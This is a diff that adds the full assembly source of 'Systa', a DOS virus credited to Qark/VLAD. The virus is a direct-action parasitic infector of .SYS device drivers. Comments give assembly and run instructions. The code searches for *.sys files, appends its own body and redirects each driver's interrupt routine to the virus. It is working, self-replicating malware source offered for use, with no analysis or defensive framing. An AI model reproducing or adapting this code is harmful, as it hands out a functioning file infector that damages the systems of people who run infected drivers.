@@ -1,0 +1,154 @@
+
+;       Systa Virus
+;
+;       Direct action parasitic SYS infector by Qark.
+;
+; This virus has less potential for spread than a .BAT infector !
+; What can I say ?  This virus sux..
+; Although, maybe this virus can be used to demonstrate SYS infection.
+;
+; To assemble: a86 systa.asm
+;              ren systa.bin systa.com
+; To infect just run the .com in the same directory as ansi.sys.
+;
+
+        org     0
+
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    ds
+        push    es
+
+        push    cs
+        pop     ds
+        push    cs
+        pop     es
+
+        mov     si,-1
+        org     $-2                     ;Delta offset
+delta   dw      100h
+
+        mov     ax,[si+sysreturn]       ;Setup return to host
+        mov     word ptr [8],ax
+        sub     ax,offset origsys+2
+        sub     ax,si
+        mov     word ptr [si+origsys],ax
+
+        mov     ah,2fh                  ;Save DTA
+        int     21h
+        mov     word ptr [si+dta],bx
+        mov     word ptr [si+dta+2],es
+
+        mov     ah,1ah                  ;Set DTA
+        lea     dx,[si+newdta]
+        int     21h
+
+        mov     ah,4eh                  ;Find first
+findnext:        
+        mov     cx,3
+        lea     dx,[si+wild]
+        int     21h
+        jnc     okfind
+        jmp     return_sys
+okfind:
+        mov     ax,3d02h                ;Open
+        lea     dx,[si+newdta+1eh]
+        int     21h
+        jnc     ok_open
+        jmp     return_sys
+ok_open:
+        mov     bx,ax
+
+        mov     ah,3fh                  ;Read header
+        mov     cx,10
+        lea     dx,[si+sysheader]
+        int     21h
+
+        mov     di,dx
+        mov     ax,word ptr [di]
+        inc     ax                      ;Sys files begin with FFFF
+        jnz     closeffirst
+        mov     ax,word ptr [di+8]      ;We infect the "interrupt" routine
+        mov     word ptr [si+sysreturn],ax
+        
+        mov     ax,4202h                ;EOF
+        xor     cx,cx
+        cwd
+        int     21h
+
+        push    ax                      ;Infection check
+        sub     ax,400
+        cmp     ax,word ptr [di+8]
+        pop     ax
+        jb      closeffirst
+        mov     word ptr [di+8],ax      ;Point interrupt routine to virus.
+        mov     word ptr [si+delta],ax
+
+        mov     ah,40h                  ;Write virus
+        mov     cx,vsize
+        mov     dx,si
+        int     21h
+
+        mov     ax,4200h                ;Start
+        xor     cx,cx
+        cwd
+        int     21h
+
+        mov     ah,40h                  ;Write modified header
+        mov     cx,10
+        lea     dx,[si+sysheader]
+        int     21h
+
+        mov     ah,3eh                  ;Close
+        int     21h
+        jmp     return_sys
+
+closeffirst:
+        mov     ah,3eh                  ;Close
+        int     21h
+        
+ffirst:
+       mov      ah,4fh                  ;Find next
+       jmp      findnext
+
+return_sys:
+        mov     dx,word ptr [si+dta]    ;Restore DTA
+        mov     ds,word ptr [si+dta+2]
+        mov     ah,1ah
+        int     21h
+
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        
+        db      0e9h
+origsys dw      0
+        int     20h
+
+        db      "SySta by Qark/VLAD",0
+
+sysreturn       dw      offset origsys+2+100h
+
+dta     dw      0
+        dw      0
+wild    db      "*.sys",0
+
+vsize   equ     $
+
+sysheader       dd      0
+sysattrib       dw      0
+strategy        dw      0
+interrupt       dw      0
+
+
+newdta  db      128 dup (0)
+buffer:
